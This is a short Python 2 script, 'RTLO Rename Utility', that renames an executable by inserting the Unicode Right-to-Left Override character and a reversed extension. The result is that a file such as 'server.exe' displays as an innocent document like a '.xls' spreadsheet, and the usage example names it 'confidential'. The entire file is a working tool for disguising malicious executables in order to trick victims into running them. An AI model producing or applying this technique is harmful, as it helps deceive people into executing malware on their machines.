# RTLO Rename Utility v1.0
# Author: Mert SARICA
# E-mail: mert [ . ] sarica [ @ ] gmail [ . ] com
# URL: http://www.mertsarica.com

import sys
import os

ext = ""

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
elif sys.platform == 'win32':
        os.system("cls")
else:
        os.system("cls")
                
print "==============================================="
print u"RTLO Rename Utility [http://www.mertsarica.com]"
print "==============================================="

if len(sys.argv) < 4:
        print "Usage: python rtlo.py [extension] [source filename] [new filename]\n"
        print "Example: python rtlo.py xls server.exe confidential\n"
        sys.exit(1)

try:
                
        if (sys.argv[1][0] is "."):
                ext = sys.argv[1].lower()
                ext = ext.replace(".", "")
        else:
                ext = sys.argv[1].lower()

        sfile = sys.argv[2]
        tfile = sys.argv[3]

        tfile = tfile.rstrip(".exe")

        #                      [RTLO]
        tfile = tfile + u"\u202E" + ext[::-1] + ".exe"
                
        try:
                os.rename(sfile, tfile)   
        except:
                print "[+] Source file not found\n"
                sys.exit(1)
                              
except KeyboardInterrupt:	
    print "[+] Bye..."

print "Consider it done sir..."
